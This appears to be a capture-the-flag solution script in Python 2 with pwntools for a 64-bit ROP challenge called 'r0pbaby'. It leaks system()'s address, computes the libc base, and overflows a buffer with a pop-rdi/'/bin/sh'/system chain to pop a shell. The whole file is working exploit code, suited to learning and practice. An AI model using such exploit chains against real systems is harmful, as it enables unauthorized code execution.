#!/usr/bin/env python2
from pwn import *
# basic 64 bit rop challenge
# rip is 8 bytes away from the start of the buffer
# we can resolve symbols in libc, so we can get system()
# on a real server, we would use libcdb to get the correct libc for the system,
# and then resolve system() and the address of /bin/sh in the system function
# this will probably be done outside of a script
# we can also parse the libc on our system, which I did for this writeup

r = process("./r0pbaby_542ee6516410709a1421141501f03760")
e = ELF("libc-2.19.so")
pop_rdi = 0x0000000000022482
bin_sh = 0x001633e8
# get libc base, address of system
r.recvuntil(": ")
r.sendline("2")
r.recvuntil(": ")
r.sendline("system")
r.recvuntil(": ")
sys_addr = int(r.recvline().strip(), 16)
log.info("System:    " + hex(sys_addr))

libc_base = sys_addr - e.symbols["system"]
log.info("Libc base: " + hex(libc_base))
pop_rdi += libc_base
bin_sh += libc_base
log.info("pop rdi: " + hex(pop_rdi))
log.info("/bin/sh: " + hex(bin_sh))

# smash it!
buf = "a" * 8 + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)
r.recvuntil(": ")
r.sendline("3")
r.recvuntil(": ")
r.sendline(str(len(buf)+1))
r.sendline(buf)
r.clean()
r.sendline("4")
r.interactive()
